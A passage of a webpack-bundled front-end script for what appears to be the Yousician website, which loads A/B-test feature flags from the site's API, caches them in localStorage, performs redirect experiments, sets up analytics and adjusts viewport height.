    // e.g. { path: "/ukulele", feature_id: "ukulele_signup_questionnaire" }
    {
      path: "/campfire",
      feature_id: "campfire_alternate"
    }];
    async function getUnleashFeatures(projectId = "web") {
      if (!js_cookie__WEBPACK_IMPORTED_MODULE_1___default.a.get("ys_visitor")) {
        console.warn("Visitor token not found. Skipping A/B tests.");
        return;
      }
      const features = getStorageValue("ys_features");
      if (features != null) {
        return features;
      }
      try {
        const visitorToken = js_cookie__WEBPACK_IMPORTED_MODULE_1___default.a.get("ys_visitor");
        let features_list = featureIds.reduce((acc, featureId) => {
          return acc += "&features=" + featureId;
        }, "");
        const url = `${window.apiUrl}/features/web?visitor_id=${visitorToken}${features_list}&project=${projectId}`;
        const res = await fetch(url, {
          method: "GET",
          headers: {
            "X-Application-Name": "YousicianMainSite"
          }
        });
        const data = await res.json();
        setStorageValue("ys_features", data.features, 1);
        return data.features;
      } catch (error) {
        console.error(`Get features error: ${error.message}`);
        return null;
      }
    }
    function getStorageValue(name) {
      const value = JSON.parse(localStorage.getItem(name));
      if (value) {
        if (value._expires && new Date().valueOf() >= value._expires) {
          return null;
        }
        return value;
      }
      return null;
    }
    function setStorageValue(name, value, expireDays) {
      var expiringValue = value;
      var date = new Date();
      date.setDate(date.getDate() + expireDays);
      date = date.valueOf();
      expiringValue._expires = date;
      localStorage.setItem(name, JSON.stringify(expiringValue));
    }
    function path_in_url(path) {
      const stringToCheck = path.toLocaleLowerCase();
      if (path.indexOf("http") >= 0) {
        return window.location.href.toLocaleLowerCase() == stringToCheck;
      }
      return window.location.pathname.toLocaleLowerCase() == stringToCheck;
    }
    function getPayloadFromFeature(features, featureId) {
      const feature = features[featureId];
      if (feature != null && feature.active == true) {
        if (feature.active == true) {
          if (feature.payload && feature.payload.value) {
            return feature.payload.value;
          }
        }
      }
      return null;
    }
    function redirectTo(urlOrPath) {
      function getBaseUrl() {
        return `${location.protocol}//${location.hostname}${location.port ? ':' + location.port : ''}`;
      }
      const fullUrl = urlOrPath.indexOf("http") >= 0 ? urlOrPath : getBaseUrl() + urlOrPath;
      window.location.replace(fullUrl);
    }
    function checkRedirectionExperiments(data) {
      // Checks the current URL against the redirection experiments
      // If matches, redirects to the URL in the payload
      redirectionExperiments.forEach(experiment => {
        if (path_in_url(experiment.path)) {
          const redirectToUrl = getPayloadFromFeature(data, experiment.feature_id);
          console.log(`payload ${redirectToUrl}`);
          if (redirectToUrl) {
            redirectTo(redirectToUrl);
          }
        }
      });
    }
    function initAnalytics() {
      // Init ysAnalytics
      window.ysAnalytics = new _yousiciangit_ys_analytics__WEBPACK_IMPORTED_MODULE_0___default.a({
        channel: "yousician-landing",
        xApplicationName: "YousicianMainSite",
        baseUrl: window.apiUrl,
        isLandingPage: window.isLandingPage === "true",
        landingPageCategory: window.landingPageCategory
      });

      // Get feature toggles from Unleash or cache
      getUnleashFeatures().then(data => {
        checkRedirectionExperiments(data);
      });
    }

    /***/
  }),
  /***/"./scripts/env.js": (
  /*!************************!*\
    !*** ./scripts/env.js ***!
    \************************/
  /*! exports provided: setupEnv */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* harmony export (binding) */
    __webpack_require__.d(__webpack_exports__, "setupEnv", function () {
      return setupEnv;
    });
    function setupEnv() {
      window.apiUrl = "https://api.yousician.com";
    }

    /***/
  }),
  /***/"./scripts/headScripts.js": (
  /*!********************************!*\
    !*** ./scripts/headScripts.js ***!
    \********************************/
  /*! no exports provided */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* harmony import */
    var _analytics_js__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./analytics.js */"./scripts/analytics.js");
    /* harmony import */
    var _env_js__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./env.js */"./scripts/env.js");
    /* 
        This file is for scripts that run in the head instead of the footer.
        Put only scripts here that are light and need to be run as soon as possible. 
    */

    // --- Functions --- //
    function fixVh() {
      var vh = window.innerHeight * 0.01;
      document.documentElement.style.setProperty('--vh', vh + 'px');
    }

    // --- Event listeners --- //
    let screenOrientation = window.matchMedia("(orientation: portrait)");
    if (screenOrientation.addEventListener) {
      screenOrientation.addEventListener("change", () => {
        fixVh();
      });
    } else {
      screenOrientation.addListener(() => {
        fixVh();
      });
    }

    // --- Trigger scripts --- //
    fixVh();
    Object(_env_js__WEBPACK_IMPORTED_MODULE_1__["setupEnv"])();
    Object(_analytics_js__WEBPACK_IMPORTED_MODULE_0__["initAnalytics"])();

    /***/
  }),
  /***/3: (
  /*!**************************************!*\
    !*** multi ./scripts/headScripts.js ***!
    \**************************************/
  /*! no static exports found */
  /***/
  function (module, exports, __webpack_require__) {
    module.exports = __webpack_require__(/*! ./scripts/headScripts.js */"./scripts/headScripts.js");

    /***/
  })

  /******/
});
//# sourceMappingURL=headScripts.js.map